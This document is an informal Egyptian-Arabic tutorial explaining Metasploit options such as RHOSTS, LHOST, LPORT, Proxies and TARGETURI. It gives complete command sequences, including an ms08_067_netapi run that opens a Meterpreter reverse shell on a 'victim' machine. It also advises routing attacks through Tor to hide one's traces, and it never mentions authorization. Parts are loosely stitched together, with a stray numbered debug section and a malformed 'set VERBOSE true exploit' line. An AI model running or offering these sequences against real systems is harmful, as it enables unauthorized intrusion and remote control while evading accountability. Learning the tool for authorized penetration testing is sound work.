 # ضبط الإعدادات (Set Options)
ببساطة، في **Metasploit**، أمر **`set options`** بيستخدم عشان تعرض الإعدادات اللي لازم تظبطها عشان تستغل ثغرة معينة أو تشغل الـ payload صح.

### الطريقة:

1. بعد ما تختار **الـ exploit** أو **الـ payload** اللي عايز تستخدمه، اكتب:
    
    ```bash
    show options
    ```
    
    # ده هيعرض لك كل الإعدادات المطلوبة، زي:


## **1️⃣ RHOSTS (Remote Hosts) – الأجهزة اللي بتهاجمها**

📌 ده **IP الضحية** اللي عايز تخترقه، سواء جهاز واحد أو مجموعة أجهزة.  
🛠️ **مثال:**

```bash
set RHOSTS 192.168.1.100
```

🔹 **المعنى:** "هاجم الجهاز اللي IP بتاعه `192.168.1.100`".

---

## **2️⃣ RPORT (Remote Port) – البورت المستهدف عند الضحية**

📌 ده **البورت** اللي الخدمة المستهدفة شغالة عليه، زي **HTTP (80)، RDP (3389)، SSH (22)**.  
🛠️ **مثال:**

```bash
set RPORT 80
```

🔹 **المعنى:** "استهدف الخدمة اللي شغالة على البورت `80` عند الضحية".

---

## **3️⃣ LHOST (Local Host) – جهازك اللي هيستقبل الاتصال العكسي**

📌 ده **IP جهازك** اللي هيستقبل الاتصال العكسي بعد نجاح الاختراق.  
🛠️ **مثال:**

```bash
set LHOST 192.168.1.50
```

🔹 **المعنى:** "خلي الضحية تتصل بجهازي على `192.168.1.50` بعد الاختراق".

---

## **4️⃣ LPORT (Local Port) – البورت اللي جهازك هيستقبل عليه الاتصال العكسي**

📌 البورت اللي جهازك هيستنى عليه الاتصال العكسي من الضحية.  
🛠️ **مثال:**

```bash
set LPORT 4444
```

🔹 **المعنى:** "هستقبل الاتصال العكسي على البورت `4444`".

---

## **5️⃣ SRVHOST (Server Host) – الجهاز اللي هيشغل السيرفر**

📌 لو هتشغل **سيرفر** عشان الضحية تحمل منه حاجة، ده **IP الجهاز اللي هيشغل السيرفر**.  
🛠️ **مثال:**

```bash
set SRVHOST 192.168.1.50
```

🔹 **المعنى:** "السيرفر هيشتغل على `192.168.1.50`".

---

## **6️⃣ SRVPORT (Server Port) – البورت اللي السيرفر هيشتغل عليه**

📌 البورت اللي السيرفر هيقدم منه الملفات أو الجلسات الخبيثة.  
🛠️ **مثال:**

```bash
set SRVPORT 8080
```

🔹 **المعنى:** "السيرفر هيشتغل على البورت `8080`".

---

## **7️⃣ Proxies – استخدام بروكسي في الهجوم**

📌 لو عايز **تموّه الهجوم** وتعدي الترافيك من خلال **VPN أو Tor**.  
🛠️ **مثال:**

```bash
set Proxies socks5:127.0.0.1:9050
```

🔹 **المعنى:** "خلي الترافيك يعدي من خلال Tor".

---

## **8️⃣ CHOST (Callback Host) – عنوان الاتصال العكسي لبعض الـ Payloads**

📌 ده العنوان اللي الضحية هتتصل عليه **في بعض أنواع الـ Payloads**.  
🛠️ **مثال:**

```bash
set CHOST 192.168.1.50
```

🔹 **المعنى:** "خلي الضحية تتصل بجهازي `192.168.1.50` بعد الاختراق".

---

## **9️⃣ CPORT (Callback Port) – بورت الاتصال العكسي لبعض الـ Payloads**

📌 زي **LPORT** بس لبعض أنواع الـ Payloads اللي بتستخدم **CPORT** بدل **LPORT**.  
🛠️ **مثال:**

```bash
set CPORT 5555
```

🔹 **المعنى:** "هستقبل الاتصال العكسي على البورت `5555`".

---

## **🔟 TARGETURI – المسار المستهدف على موقع الويب**

📌 لو بتهاجم **موقع ويب**، وعايز تستهدف مسار معين زي **لوحة تحكم**.  
🛠️ **مثال:**

```bash
set TARGETURI /admin
```

🔹 **المعنى:** "استهدف `/admin` على الموقع".

---

## **1️⃣1️⃣ VHOST (Virtual Host) – لو الموقع عنده أكتر من دومين على نفس الـ IP**

📌 لو **السيرفر مستضيف أكتر من موقع** على نفس الـ **IP**، بتحدد الموقع المستهدف هنا.  
🛠️ **مثال:**

```bash
set VHOST admin.example.com
```

🔹 **المعنى:** "هاجم `admin.example.com` اللي مستضاف على نفس السيرفر".

---

## **1️⃣2️⃣ EXITFUNC – طريقة إنهاء الـ Payload بعد تنفيذه**

📌 بيحدد الطريقة اللي الجلسة بتتقفل بيها بعد تنفيذ الـ **Payload**.

- **thread** → يقفل الجلسة بس يسيب باقي العمليات شغالة.
- **process** → Payload يقفل الجلسة والبرنامج اللي شغال فيه الـ .
- **seh** → طريقة متقدمة لإدارة الأخطاء.  
    🛠️ **مثال:**

```bash
set EXITFUNC thread
```

🔹 **المعنى:** "بعد ما الـ Payload يشتغل، يقفل الجلسة بدون ما يخرب النظام".

---

## **1️⃣3️⃣ URI – الرابط أو المسار اللي هيشتغل عليه الاستغلال**

📌 بعض الهجمات محتاجة رابط معين للـ **Payload**.  
🛠️ **مثال:**

```bash
set URI /exploit
```

🔹 **المعنى:** "الـ Payload هيشتغل على `/exploit`".

دائما هتخليه كده علشان تبقي ال root
```bash
set URI /
```
---

## **🔥 مثال عملي على استغلال ثغرة في موقع ويب**

```bash
use exploit/unix/webapp/some_exploit    # استخدم استغلال ويب
set RHOSTS 192.168.1.100                 # استهدف الجهاز الضحية
set RPORT 80                              # استهدف خدمة HTTP
set TARGETURI /admin                      # استهدف لوحة التحكم
set VHOST target.example.com              # تحديد الموقع المستهدف
set LHOST 192.168.1.50                    # استقبال الاتصال العكسي
set LPORT 4444                             # بورت الاتصال العكسي
exploit                                   # نفّذ الهجوم
```

🔹 **ده معناه:**

1. بتهاجم سيرفر على **192.168.1.100**
2. الخدمة المستهدفة **HTTP على البورت 80**
3. الهجوم على **المسار `/admin`**
4. الاستغلال هيشتغل داخل **الموقع `target.example.com`**
5. لما الضحية تتخترق، **هتبعت اتصال عكسي لجهازك على `192.168.1.50:4444`**

---

🔥 **كده انت فهمت كل الـ Set Options في Metasploit** 💣💻  
لو عندك أي سؤال، اسألني وأنا تحت أمرك! 😎👊
## 🔍 **4. استخدام خيار Debug لرؤية تفاصيل أكثر**

يمكنك تشغيل الاستغلال مع **التفاصيل الإضافية** لمعرفة سبب الفشل:



    
    set VERBOSE true exploit`
    
هذا قد يعرض تفاصيل أكثر عن سبب فشل العملية.

### 🔥 **مثال عملي لتشغيل استغلال Reverse Shell**

```bash
use exploit/windows/smb/ms08_067_netapi  # اختر الثغرة
set RHOSTS 192.168.1.100                 # حدد الهدف
set RPORT 445                             # حدد المنفذ
set LHOST 192.168.1.50                    # جهازك لاستقبال الاتصال العكسي
set LPORT 4444                            # المنفذ اللي هتستقبل عليه الاتصال
set EXITFUNC process                      # إنهاء الجلسة بعد التنفيذ
exploit                                   # شغل الهجوم
```

**النتيجة؟** 🎯 الجهاز الهدف هيتخترق، وهتفتح معاك جلسة **Meterpreter** تقدر تتحكم بيها في الهدف.

🚀 **جاهز لأي استفسارات تانية!** 💻🔥
### خلاصة الكلام:

- **RHOSTS** = الجهاز اللي بتهاجمه.
- **RPORT** = الباب اللي هتدخل منه.
- **Proxies** = تخفي أثرك وانت داخل.
- **CHOST** = الجهاز اللي المستهدف هيتصل بيه بعد ما يتخترق.
- **CPORT** = الباب اللي الجهاز المخترق هيتصل بيك عليه.



2. بعد كده، عشان تضبط أي قيمة، استخدم **`set`** بالشكل ده:
    
    ```bash
    set RHOSTS 192.168.1.100
    set LHOST 192.168.1.50
    set LPORT 4444
    ```
    
3. بعد ما تظبط الإعدادات، شغل الهجوم بكتابة:
    
    ```bash
    exploit
    ```
    
